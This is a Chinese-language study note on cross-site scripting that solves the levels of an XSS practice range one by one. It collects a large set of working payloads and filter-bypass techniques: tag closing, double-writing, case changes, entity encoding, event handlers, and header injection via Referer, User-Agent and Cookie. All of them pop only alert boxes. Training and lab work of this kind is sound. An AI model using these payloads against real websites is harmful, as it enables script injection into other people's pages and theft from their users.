# XSS

Cross Site Scripting

==跨站脚本攻击==

基本原理就是将恶意的script插入js中



```js
<script>
    alert(document.cookie)
</script>
```



## Reflected

表单提交

```
?payload=<script>alert(‘1’)</script>
```



## Stored

评论之类的，







## DOM

属性方法

document.write

标志#



DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如`img`，`input`等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。





## xss-challenge-tour

参考资料：[xss小游戏1-20，详细攻略（level14，level19详解）_xss闯关1-20-CSDN博客](https://blog.csdn.net/jhfjdf/article/details/118739128)

在线靶场：https://www.bachang.org/



### 1.

```
?name=<script>alert(1)</script>
```

熟悉



### 2.

进行同样的测试

输入框输入

```
<script>alert(1)</script>
```



```
?keyword=<script>alert(1)</script>&submit=搜索
```



F12观察到某个value变成了

```
<input name=keyword  value="<script>alert(1)</script>">
```



所以构造闭合，来让js代码执行



前面加上">直接让标签闭合即可

```
"><script>alert(1)</script>
```



### 3.

同样的

输入框输入

```
<script>alert(1)</script>
```



F12查看发现

```
<input name=keyword  value='&lt;script&gt;alert(1)&lt;/script&gt;'>
```



再输入第二关的绕过

```
"><script>alert(1)</script>
```



发现

```
<input name=keyword  value='&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'>
```



没有用

上网看资料，说使用onmouseover进行构造利用

onmouseover事件会在鼠标指针移动到指定的元素上发生



所以直接

```
xx' onmouseover='alert(1)
```



但是结果会变成

```
<input name=keyword  value='xx' onmouseover='alert(1)'>
```



改一下alert

```
xx' onmouseover='alert(1)
```



过关



### 4.

还是一样进行测试

```
<script>alert(1)</script>
```



可以发现结果变成

```
<input name=keyword  value="scriptalert(1)/script">
```



<>闭合标签给过滤了



试试payload3的样子

```
xx' onmouseover='alert(1)
```



结果变成

```
<input name=keyword  value="xx' onmouseover='alert(1)">
```



所以尝试改单引号变为双引号



```
xx" onmouseover="alert(1)
```

通关



### 5.

尝试payload4

```
xx" onmouseover="alert(1)
```

查看源代码，可以发现



```
<input name=keyword  value="xx" o_nmouseover="alert(1)">
```

on被过滤为o_n了

说明这个方法给ban了



姿态二

```
"> <a href="javascript:alert(1)">1</a>
```

可以预想到">进行标签闭合

加上一个超链接标签

然后直接点击超链接进行跳转



### 6.

使用payload5进行提交

```
"> <a href="javascript:alert(1)">1</a>
```

得到结果

```
<input name=keyword  value=""> <a hr_ef="javascript:alert(1)">1</a>">
```

说明 a标签也给过滤掉了



尝试一下大小写绕过

```
"> <a Href="javascript:alert(1)">1</a>
```



### 7.

使用payload6进行提交

```
"> <a Href="javascript:alert(1)">1</a>
```



结果为

```
<input name=keyword  value=""> <a ="java:alert(1)">1</a>">
```



滤过了href和script



改个方式

```
"><script>alert(1)</script>
```



结果为

```
<input name=keyword  value=""><>alert(1)</>">
```



过滤掉script

直接双写绕过

```
"><sscriptcript>alert(1)</scscriptript>
```



### 8.

尝试添加

```
<script>alert(1)</script>
```



查看元素发现

```
<center><BR><a href="<scr_ipt>alert(1)</scr_ipt>">友情链接</a></center><center><img src=level8.jpg></center>
```



分析：

首先滤过了script，也不能双写

尝试直接提交

```
javascript:alert(1)
```

变成了

```
<a href="javascr_ipt:alert(1)">友情链接</a></center><center><img src=level8.jpg></center>
```



上网查看一下a标签还有什么元素可以操作

尝试将JavaScript进行unicode编码转义

选择 Unicode 转 ASCII码进行计算

结果为

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

直接payload



### 9.

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

提交显示不合法



没有思路，我先写一个正常的www.baidu.com

发现也不合法

会不会是前面要加http之类的呢？

```
http://www.baidu.com
```



发现结果正确，并且可以访问，看元素

```
<a href="http://www.baidu.com">友情链接</a>
```



那就下面进行测试

```
http://javascript:alert(1)
```

发现绕过script，试试上面的

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;// http://
```



通过



### 10.

没有搜索框，但是可以发现URL

```
?keyword=well%20done!
```



随便写几个上去测试一下

```
?keyword=<script>alert(1)</script>
```



发现它好像没有在元素里面

```
<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2><center>
```

再看看源码

发现有个from，但是被hidden了

```
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
</form>
```

那我们就一起传值看看效果

```
?keyword=&t_link=1&t_history=2&t_sort=3
```



发现t_sort被传入了

```
?keyword=&t_link=1&t_history=2&t_sort="><script>alert(1)</script>
```



输入发现

```
<input name="t_sort"  value=""scriptalert(1)/script" type="hidden">
```



说明过滤了><



```
?t_sort=" οnclick="alert(1)" type=" "
```



最终payload

```
?t_link=&t_history=&t_sort="%20onclick="alert(1)"%20type=""
```





### 11.



还是一样选择进行尝试

```
?t_link=1&t_history=2&t_ref=4&t_sort=3
```

发现t_sort进行传值



```
?t_link=1&t_history=2&t_ref=4&t_sort="><script>alert(1)</script><"
```

发现会进行转码

同理尝试

```
?t_link=1&t_history=2&t_ref=4&t_sort="%20onclick="alert(1)"%20type=""
```

发现""被转义了

```
<input name="t_sort"  value="&quot; onclick=&quot;alert(1)&quot; type=&quot;&quot;" type="hidden">
```



看wp，思考发现要从http下手



bp进行抓包

```
Referer: "type="text" autofocus onfocus="alert(1)"
```





### 12.

直接加到最后面即可

```
User-Agent: " type="text" autofocus onfocus="alert(1)"
```





### 13.

直接修改Cookie

```
Cookie: user=" type="button" onclick="alert(1)
```



### 14.

在线靶场无法显示上传按钮，不知道什么情况，直接改URL跳转到15题



后续发现可能是靶场太老，火狐也无法显示

但是看wp，说是改上传图片的exif信息来触发xss漏洞攻击

### 15.

```
'level1.php?name=test<img src=1 onerror=alert(1)>'
```





### 16.

```
<img%0Asrc=1%0Aonerror=alert(1)>
```



```
?keyword=<img%0Asrc=1%0Aonerror=alert(1)>
```



### 17.

xsf04.swf

后面四个都是使用flash的，需要安装flash才能有弹窗，flash就是swf文件，后面四道题都需要，这里就不做了。

### 18.

### 19.

### 20.

需要FFdec反编译xsf04.swf



### 总结：

- 标签语法替换 
- 特殊符号干扰 
- 提交方式更改 
- 垃圾数据溢出 
- 加密解密算法 
- 结合其他漏洞绕过

标签闭合，双写绕过，大小写绕过，==alert，confirm，prompt==，构造a，img标签，转为Unicode编码，autofocus 属性，http报文中篡改等等

总的来说

```
"><script>alert(1)</script>
xx' onmouseover='alert(1)
xx" onmouseover="alert(1)
"> <a href="javascript:alert(1)">1</a>
"> <a Href="javascript:alert(1)">1</a>
"><sscriptcript>alert(1)</scscriptript>
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
?t_link=&t_history=&t_sort="%20onclick="alert(1)"%20type=""
Referer: "type="text" autofocus onfocus="alert(1)"
User-Agent: " type="text" autofocus onfocus="alert(1)"
Cookie: user=" type="button" onclick="alert(1)
'level1.php?name=test<img src=1 onerror=alert(1)>'
?keyword=<img%0Asrc=1%0Aonerror=alert(1)>
```





- audio

```
<audio src=x onerror=alert(47)>
<audio src=x onerror=prompt(1);>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
```



- video

```
<video src=x onerror=prompt(1);>
<video src=x onerror=alert(48)>
```



- div

```
<div style="width:expression(alert(/1/))">1</div>     ie浏览器执行
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>   url编码绕过
```



- math

```
<math><a/xlink:href=javascript:prompt(1)>Xss

<math href="javascript:javascript:alert(1)">Xss</math>
```



- button

```
<button onfocus=alert(1) autofocus>
<button/onclick=alert(1) >xss</button>
```



- keygen

```
<keygen/onfocus=prompt(1);>
<keygen onfocus=javascript:alert(1) autofocus>
```



- object

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    
      解码：<script>alert(1)</script>
```





自动化工具fuzz



